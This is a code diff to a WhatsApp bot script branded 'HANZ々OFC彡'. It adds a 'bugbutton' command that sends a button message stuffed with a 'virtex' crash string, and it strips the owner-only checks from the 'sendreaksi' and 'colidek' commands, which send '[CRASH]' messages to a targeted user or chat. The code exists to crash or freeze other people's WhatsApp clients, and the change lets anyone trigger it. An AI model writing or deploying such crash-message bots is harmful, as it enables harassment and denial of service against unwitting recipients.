@@ -3616,8 +3616,31 @@ message: { "contactMessage": {
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fkon})
 break      
 
-case 'sendreaksi' :
-if(!isCreator) return m.reply("Khusus Owner") 
+case 'bugbutton': {
+let buttons = [
+{buttonId: `Jembod`, buttonText:{displayText:`HANZ々OFC彡-${virtex1(prefix)}`,}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: fs.readFileSync('./menu1.jpeg'),
+                    caption: `💤HANZ々OFC彡💤\n
+╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
+┃╭┈─────────────⩵꙰ཱི࿐
+┃╰── ⏤͟͟͞Script Bot──➤ ↶↷*
+╰•͙✩̣̣̣̣
+⁙┃〲◦➛Link Sc: https://bit.ly/3vJZJ7n
+⁙┃〲◦➛Link Donasi: https://saweria.co/harisnew
+⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
+⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
+⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
+${virtex1(prefix)}`,
+                    footer: virtex1,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+            break
+case 'sendreaksi' : {
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                 a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                 await hisoka.sendMessage(Pe, {text:"HANZ々OFC彡 [CRASH]"}, {quoted: a})
@@ -3649,8 +3672,7 @@ m.reply(`SUCCES`)
                 await sleep(20)
             }
                 break
-case 'colidek' : 
-if(!isCreator) return m.reply("Khusus Owner") 
+case 'colidek' : {
                     a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                     await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
                     await hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡I GIVE [CRASH]"}, {quoted: a})
